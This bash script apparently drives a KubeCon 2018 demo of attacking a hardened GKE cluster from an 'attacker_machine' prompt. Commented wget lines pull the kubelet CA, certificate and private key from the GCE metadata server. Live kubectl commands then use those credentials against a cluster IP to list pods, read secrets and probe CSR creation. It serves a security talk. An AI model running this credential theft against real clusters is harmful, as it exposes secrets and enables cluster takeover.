#!/bin/bash

# $Id: $

set -o errexit
set -o pipefail

: ${PROJECT:="gcastle-gke-dev"}
: ${ZONE:="us-west1-b"}
: ${CLUSTER:="kubecon2018-hardened"}

DEMOMAGIC="demo-magic.sh"

if [ ! -f $DEMOMAGIC ]; then
  curl -OsS -L https://raw.githubusercontent.com/paxtonhare/demo-magic/master/demo-magic.sh 
fi

DEMO_PROMPT="attacker_machine$ "
. demo-magic.sh
RED="\033[0;91m"
clear
echo ""
echo ""

#pe "kubectl delete clusterrolebinding kubelet-cluster-admin"
# Retrieving these keys: SSH into node
# wget --header="Metadata-Flavor: Google" -qO- http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env | grep CA_CERT | sed s'/CA_CERT: //g' | base64 -d
# wget --header="Metadata-Flavor: Google" -qO- http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env | grep KUBELET_CERT | sed s'/KUBELET_CERT: //g' | base64 -d
# wget --header="Metadata-Flavor: Google" -qO- http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env | grep KUBELET_KEY | sed s'/KUBELET_KEY: //g' | base64 -d

# empty kubeconfig to make sure we're acting as the kubelet
export KUBECONFIG=$(mktemp /tmp/kubeconfig.XXXXXX)
p "${RED}kubectl --client-certificate ../kubelet_keys/client_hardened.crt \ "
DEMO_PROMPT="> "
p "${RED}--client-key ../kubelet_keys/client_hardened.pem \ "
p "${RED}--certificate-authority ../kubelet_keys/ca_hardened.crt \ "
p "${RED}get pods --all-namespaces${COLOR_RESET}"
DEMO_PROMPT="attacker_machine$ "

kubectl --client-certificate ../kubelet_keys/client_hardened.crt --client-key ../kubelet_keys/client_hardened.pem --certificate-authority ../kubelet_keys/ca_hardened.crt --server https://35.185.246.11 get pods --all-namespaces || true
p "${RED}kubectl get secrets${COLOR_RESET}"
kubectl --client-certificate ../kubelet_keys/client_hardened.crt --client-key ../kubelet_keys/client_hardened.pem --certificate-authority ../kubelet_keys/ca_hardened.crt --server https://35.185.246.11 get secrets || true
p "${RED}kubectl auth can-i create certificatesigningrequests${COLOR_RESET}"
kubectl --client-certificate ../kubelet_keys/client_hardened.crt --client-key ../kubelet_keys/client_hardened.pem --certificate-authority ../kubelet_keys/ca_hardened.crt --server https://35.185.246.11 auth can-i create certificatesigningrequests || true 

